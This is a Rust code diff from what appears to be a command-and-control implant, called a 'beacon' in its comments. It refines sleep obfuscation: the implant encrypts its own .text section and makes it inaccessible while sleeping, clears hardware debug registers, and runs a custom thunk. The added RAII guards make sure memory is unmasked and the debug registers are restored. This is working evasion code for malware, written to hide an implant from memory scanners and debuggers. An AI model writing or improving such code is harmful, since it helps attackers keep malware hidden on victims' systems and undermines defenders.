@@ -30,6 +30,39 @@ pub fn sleep(seconds: u32) {
     }
 }
 
+/// RAII: unmask the registered regions on drop. DEFENSE-IN-DEPTH only — the
+/// PRIMARY unmask now runs inline in the fluctuation thunk (Step 4 in
+/// `fluctuation_thunk`) after the `.text` RX restore, which closes the
+/// hardware-exception window that `panic=abort` Drop cannot (a `#PF`/`#AV`
+/// during PAGE_NOACCESS sleep terminates the process before Drop runs).
+///
+/// This guard still earns its keep for the early-`?`/`return` paths inside
+/// `do_fluctuate` that occur AFTER `mask()` but BEFORE the thunk runs (e.g. a
+/// `transmute`/build failure between `mask()` and `thunk_fn()`): without it
+/// those paths would leave the regions encrypted. `unmask()` is idempotent
+/// (MASK_STATE CAS), so when the thunk already unmasked, this drop is a no-op.
+struct MaskGuard;
+impl Drop for MaskGuard {
+    fn drop(&mut self) {
+        crate::mem::unmask();
+    }
+}
+
+/// RAII: restore debug registers on drop. Pairs with `clear_dr_state`; ensures
+/// the saved DR0-DR7 snapshot is restored even on early scope exit after clear.
+struct DrGuard<'a> {
+    saved: DrState,
+    rt: &'a crate::syscalls::Runtime,
+}
+impl<'a> Drop for DrGuard<'a> {
+    fn drop(&mut self) {
+        // SAFETY: restore_dr_state writes debug registers via NtContinue. This
+        // is the same operation the original code did explicitly after thunk_fn;
+        // wrapping in a Drop guard ensures it runs on early-exit paths too.
+        unsafe { restore_dr_state(self.rt, &self.saved); }
+    }
+}
+
 unsafe fn do_fluctuate(seconds: u32) -> bool {
     let rt = match crate::syscalls::global() { Some(r) => r, None => return false };
     let region = match crate::sleep::own_text_region() { Some(r) => r, None => return false };
@@ -56,6 +89,12 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
     let thunk = crate::fluctuation_thunk::build(
         prot_tramp, delay_tramp,
         region.base as usize, region.len, seconds,
+        // CRIT-5: pass `mem::unmask` so the thunk can call it inline after the
+        // RX restore, closing the hardware-exception window (see thunk docs).
+        // Absolute VA, PIC-stable (the beacon's .text base is fixed for the
+        // process lifetime; the thunk is built fresh each sleep but the VA is
+        // resolved at build time here).
+        crate::mem::unmask as *const () as usize,
     );
     core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);
 
@@ -66,16 +105,23 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
     let saved_dr = save_dr_state(rt);
     clear_dr_state(rt);
 
+    // RAII guards: DEFENSE-IN-DEPTH backstops. The thunk (Step 4) is the
+    // PRIMARY unmask/DR-restore path — it runs inline after the RX restore on
+    // the always-RX thunk page, so it survives hardware exceptions during
+    // sleep that Drop cannot. These guards only fire on early `?`/`return`
+    // paths AFTER mask() but BEFORE the thunk runs. Declared so Rust's reverse-
+    // declaration drop order runs MaskGuard (unmask) BEFORE DrGuard (restore
+    // DR) — matching the original explicit order (unmask .text, then restore
+    // HWBPs). Created BEFORE mask() so the encrypted window is always covered.
+    let _dr_guard = DrGuard { saved: saved_dr, rt };
+    let _mask_guard = MaskGuard;
     crate::mem::mask();
     let thunk_fn: unsafe extern "system" fn() = core::mem::transmute(page);
     thunk_fn();
-    crate::mem::unmask();
-
-    // Restore HWBPs immediately after wake — the thunk has
-    // already restored .text to RX, so we're executing normally.
-    // NtContinue with CONTEXT_DEBUG_REGISTERS only touches DRx,
-    // leaving RIP/RSP/EFlags unchanged.
-    restore_dr_state(rt, &saved_dr);
+    // By here the thunk has ALREADY called mem::unmask() inline (Step 4) after
+    // restoring .text to RX, so MaskGuard::drop will hit the idempotency CAS
+    // (1→0 already done) and no-op. The guards remain as backstops for any
+    // early-exit path that bypassed the thunk.
 
     let nt_free_va = match resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") {
         Some(a) => a, None => return true,
